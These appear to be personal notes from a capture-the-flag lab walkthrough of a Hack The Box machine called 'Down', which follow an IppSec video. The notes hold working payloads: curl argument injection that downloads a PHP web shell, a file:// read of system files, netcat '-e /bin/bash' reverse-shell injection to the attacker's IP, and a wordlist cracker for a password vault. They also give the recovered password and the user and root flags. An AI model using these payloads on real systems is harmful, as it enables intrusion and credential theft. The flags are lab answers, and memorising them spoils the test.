# Down
Website is a 'is it down?' website that you can enter a URL into.

## IppSec Notes:
- https://www.youtube.com/watch?v=mi_t2Nz8dPk
- Page Source tells you it's `php` website
- Making it 404 tells you it's `Apache/2.4.52 (Ubuntu) Server at 10.129.234.87 Port 80`
- Might want to start Gobuster up to enum other .php files on the server
- Set up nc listener and gave website local URL
- User-Agent is `curl/7.81.0`
- Since it's curl, it's likely the page is making a system command to run things - try using Burp for Command Injection
- Proxy request to local IP and sent to repeater
```POST /index.php HTTP/1.1
Host: 10.129.234.87
Content-Length: 34
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.129.234.87
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.129.234.87/index.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

url=http%3A%2F%2F10.10.14.4%3A4444
```
- From repeater he learns the response is 1,064 bytes
- Adds `;sleep 1` to `url=` but URL encodes it to `%3bsleep+1`: Highlight text --> Convert Selection --> URL encode
- Server does not respond, semi-colon seems to be breaking things
- Makes server:
```
┌──(root㉿kali)-[/home/jacob/Desktop/down]
└─# mkdir www

┌──(root㉿kali)-[/home/jacob/Desktop/down]
└─# cd www                                                                                                                                                   

┌──(root㉿kali)-[/home/jacob/Desktop/down/www]
└─# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
- I changed my Burp capture from 4444 --> 8000. The command for custom port is:
```
┌──(root㉿kali)-[/home/jacob/Desktop/down/www]
└─# python3 -m http.server 4444 
```
- Tested CI with `url=http%3A%2F%2F10.10.14.4%3A4444/$(id)` but it appears as:
```
┌──(root㉿kali)-[/home/jacob/Desktop/down/www]
└─# python3 -m http.server 4444                                                                                                                              
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
10.129.234.87 - - [05/Jul/2025 18:50:24] code 404, message File not found
10.129.234.87 - - [05/Jul/2025 18:50:24] "GET /$(id) HTTP/1.1" 404 -
```
- The fact we can see the URI as is, means it's not CI.
- The reason we're doing this is because we know it's using curl and therefore system commands
- Knowing it's a curl command followed by URL, he tries: `url=-x+POST+http%3A%2F%2F10.10.14.4%`
- Error message: `Only protocols http or https allowed.`
- Clearly expecting the 'string' to start with `http` or `https` so moves it to the end `url=http%3A%2F%2F10.10.14.4%3A4444/-x+POST`
- Doesn't work - realises it's capital X: `url=http%3A%2F%2F10.10.14.4%3A4444/-+X+POST` (Lowercase x is for proxy)
- And we see we can inject arguments into curl, evidenced by the POST which we asked curl to do with -X
```
┌──(root㉿kali)-[/home/jacob/Desktop/down/www]
└─# python3 -m http.server 4444                                                                                                                              
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
10.129.234.87 - - [05/Jul/2025 19:02:07] "POST / HTTP/1.1" 501 - <------ HERE
```
- Goes to: `https://gtfobins.github.io/` and searches for curl: `https://gtfobins.github.io/#curl`
- Makes a `shell.php` locally, `vi shell.php':
```
<?php$
system($_REQUEST['cmd']);$
?>$
```
- Start python webserver again
```
┌──(root㉿kali)-[/home/jacob/Desktop/down/www]
└─# python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
```
- New URL: `url=http%3A%2F%2F10.10.14.4%3A4444/shell.php+-o+/var/www/html/shell.php`
- Our server sees it with a 200:
```
┌──(root㉿kali)-[/home/jacob/Desktop/down/www]
└─# python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
10.129.234.87 - - [05/Jul/2025 19:16:21] "GET /shell.php HTTP/1.1" 200 -
```
- Now we see if we can hit by navigating to `http://10.129.234.87/shell.php`
- However, we get a 404 which means the user running the command doesn't have permissions to write into the HTML directory
- He looks for hosted images directory but clicking on images and watching the url for `/images/xyz.jpeg` because the user might have write access there.
- If you could, you'd drop the shell into that directory and execute it via the browser by going to `/images/shell.php` etc
- Since `-o` argument didn't give us much, back to the drawing board
- A command like `curl ippsec google.com` makes curl try `ippsec` then `google.com` so we can try something like `http://+<then anything we want>. (+ for URL encoded space)
- And curl can grab files so try: `url=http%3A%2F%2F+file:///etc/passwd` looking for file disclosure.
- So by beginning the url with HTTP/HTTPS, we bypass the previous error where it asked for only those two protocols, and then curl asked for the passwd file with `file:///etc/passwd`. Therefore the command really being run is `curl file:///etc/passwd` after we've bypassed the filter.
- And it returns the passwd file (Y) so we can read files
- Next: `url=http%3A%2F%2F+file:///proc/self/cwd/index.php` -- /proc/self/cwd/ is the current working directory.
	- /proc/ = Linux process filesystem
	- /proc/self/ = refers to the current process (whatever process is accessing it)
	- /proc/self/cwd/ = current working directory of that process
- `url=http%3A%2F%2F+file:///var/www/html/index.php` also returns the files, but incase it was not default, `/proc/self/cwd` does the job.
- He saves the output intop a html file, and then views it in the browser to make it more readable.
- Reverse engineers the index.php file to see how it was filtering, finds an 'expert mode' 
- Finds `/?expertmode=tcp` from looking at the HTML
- Tests it by entering his IP and port to a netcat listener
```
┌──(root㉿kali)-[/home/jacob/Desktop/down/www]
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.4] from (UNKNOWN) [10.129.234.87] 54210
```
- Then proxies it and request to repeater
```
POST /index.php?expertmode=tcp HTTP/1.1
Host: 10.129.234.87
Content-Length: 22
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.129.234.87
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.129.234.87/index.php?expertmode=tcp
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

ip=10.10.14.4&port=4444
```
- Tries: `ip=10.10.14.4&port=4444+-e+/bin/bash`
- Sees it hit the netcat listener, then (without escaping the netcat session) `python3 -c 'import pty;pty.spawn("/bin/bash")'` to get a shell:
```
┌──(root㉿kali)-[/home/jacob/Desktop/down/www]
└─# nc -lvnp 4444                                                                                                                                            
listening on [any] 4444 ...
connect to [10.10.14.4] from (UNKNOWN) [10.129.234.87] 50172
python3 -c 'import pty;pty.spawn("/bin/bash")'                                                                                                               
www-data@down:/var/www/html$ ls
ls
index.php  logo.png  style.css  user_aeT1xa.txt
www-data@down:/var/www/html$ ls -la
ls -la
total 332
drwxr-xr-x 2 root root   4096 Apr  8 23:09 .
drwxr-xr-x 3 root root   4096 Sep  6  2024 ..
-rw-r--r-- 1 root root   3041 Sep  6  2024 index.php
-rw-r--r-- 1 root root 316218 Sep  6  2024 logo.png
-rw-r--r-- 1 root root   1794 Sep  6  2024 style.css
-r--r--rw- 1 root root     33 Apr  8 23:09 user_aeT1xa.txt
www-data@down:/var/www/html$ 
```
- User flag found in `user_aeT1xa.txt`:`d4bc94b386ef7c8113698a8c4951cacd`
- All directories owned by root so we couldn't just drop a shell.php earlier (`--rw` means read/write?)
- Now we need to get root, start looking for DBs but none here
- Runs `find . -type f` which **finds all files in the current directory and all subdirectories recursively**
	- find = search for files/directories
	- . = start from current directory
	- -type f = only show files (not directories)
- Nothing of interest
- Goes back to `cd /home` to do the same, `find . -type f`:
```
www-data@down:/var/www/html$ cd /home
cd /home
www-data@down:/home$ find . -type f             
find . -type f
./aleks/.lesshst
./aleks/.bashrc
./aleks/.sudo_as_admin_successful
./aleks/.local/share/pswm/pswm <-- tries here
find: ‘./aleks/.cache’: Permission denied
find: ‘./aleks/.ssh’: Permission denied
./aleks/.profile
./aleks/.bash_logout
www-data@down:/home$ 
```
- In `pwsm` he found base64 encoded strings delimited by *:
```
cat pswm
e9laWoKiJ0OdwK05b3hG7xMD+uIBBwl/v01lBRD+pntORa6Z/Xu/TdN3aG/ksAA0Sz55/kLggw==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ==www-data@down:/home/aleks/.local/share/pswm$ 
```
- Googles `pswm` and finds a github: `https://github.com/Julynx/pswm`
- Finds this function: `https://github.com/Julynx/pswm/blob/main/pswm#L322`
- Copies the function into `vi crack.py` locally
- Copies the output of `cat pswm` into `vi pswm`
- See the function uses cryptocode library so makes a python env: `python3 -m venv .venv` --> `source .venv/bin/activate` --> `pip3 install cryptocode`
- Edits crack.py to `import cryptocode`. `import os` + `import sys`
- Code looks to return FALSE, or return the decrpyted content if we can
- Appends a loop to the function, which is going to be the worldlist:
```
with open(sys.argv[1]) as wordlist:
    for pw in wordlist:
        decrypted = encrypted_file_to_lines('pswm', pw.strip())
        if decrypted:
            print(pw)
            print(decrpyted)
            sys.exit
```
- Calls the defined function in the loop with the file name and `pw` which is the passwords coming from rockyou.txt
- Runs `python3 crack.py /usr/share/wordlists/rockyou.txt`
- Unzip rockyou.txt.gz: `gunzip rockyou.txt.gz`
- Wait sometime, added .strip() to pw to ensure the passwords don't include the end of line.
- Needed to kill process `ps -ef | grep crack` --> `kill <1234567>` (process id)
- Cracked
```
┌──(.venv)(root㉿kali)-[/home/jacob/Desktop/down/www]
└─# python3 crack.py /usr/share/wordlists/rockyou.txt                        
flower

['pswm\taleks\tflower', 'aleks@down\taleks\t1uY3w22uc-Wr{xNHR~+E']
```
```
┌──(.venv)(root㉿kali)-[/home/jacob/Desktop/down/www]
└─# printf "aleks@down\taleks\t1uY3w22uc-Wr{xNHR~+E"
aleks@down      aleks   1uY3w22uc-Wr{xNHR~+E
```
- Password is: `1uY3w22uc-Wr{xNHR~+E` for `ssh aleks@10.129.234.87`
- `sudo -l` then `sudo su` then `cd ~` for root directory
```
aleks@down:~$ sudo su
root@down:/home/aleks# cd ~
root@down:~# ls
root.txt  snap
root@down:~# cat root.txt
87bb9869a311b8abb5fb4d3c7248fdcb
```
- DONE
## NMAP

```
┌──(root㉿kali)-[/home/jacob/Desktop]
└─# mkdir down

┌──(root㉿kali)-[/home/jacob/Desktop]
└─# cp nmap.sh down/

┌──(root㉿kali)-[/home/jacob/Desktop]
└─# cd down

┌──(root㉿kali)-[/home/jacob/Desktop]
└─# ./nmap.sh down 10.129.234.87
Running nmap scan on 10.129.234.87 with output to down...
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-05 18:07 AEST
Nmap scan report for 10.129.234.87
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f6:cc:21:7c:ca:da:ed:34:fd:04:ef:e6:f9:4c:dd:f8 (ECDSA)
|_  256 fa:06:1f:f4:bf:8c:e3:b0:c8:40:21:0d:57:06:dd:11 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Is it down or just me?
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.06 seconds
Scan completed successfully.
Output files created: down.nmap, down.gnmap, down.xml


```
## Guided Mode Questions
1. How many open TCP ports are listening on Down?
- 2

2. What is the User Agent string used in HTTP requests made by the web application?
- First I intercepted a reply in BurpSuite which did not contain it's 'User Agent' string - turns out that's not a thing.
- Set up a netcat listener with `nc -lvnp 4444` 
- `ifconfig tun0` for tun0 ip: 10.10.14.14
- Therefore, URL for the website to hit = `http://10.10.14.4:4444`
```
┌──(root㉿kali)-[/home/jacob/Desktop/down]
└─# nc -lvnp 4444                                                                                                                                            
listening on [any] 4444 ...
connect to [10.10.14.4] from (UNKNOWN) [10.129.234.87] 49338
GET / HTTP/1.1
Host: 10.10.14.4:4444
User-Agent: curl/7.81.0 <----- ANSWER
Accept: */*
```

3. The web application only accepts two protocols in user-provided URLs. One is HTTP. What is the other?
- ....HTTPS

4. What is the username with id 1000 on Down?
- Aleks

5. What is the name of the HTTP GET parameter that changes the site's functionality?
- expertmode

6. What user is the web application running as on Down?
- www-data
- For this you netcat listener, to python shell, to `whoami`
```
┌──(root㉿kali)-[/home/jacob/Desktop/down/www]
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.4] from (UNKNOWN) [10.129.234.87] 39576
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@down:/var/www/html$ whoami
whoami
www-data <-- HERE
www-data@down:/var/www/html$ 
```

7. User Flag

8. What is the full path of the file owned by aleks that contains encrypted passwords?
- /home/aleks/.local/share/pswm/pswm

9. What python module does pwsm use to encrypt/decrypt data?
- Cryptocode

10. What is the aleks user's pwsm master password?
- flower

11. Root Flag
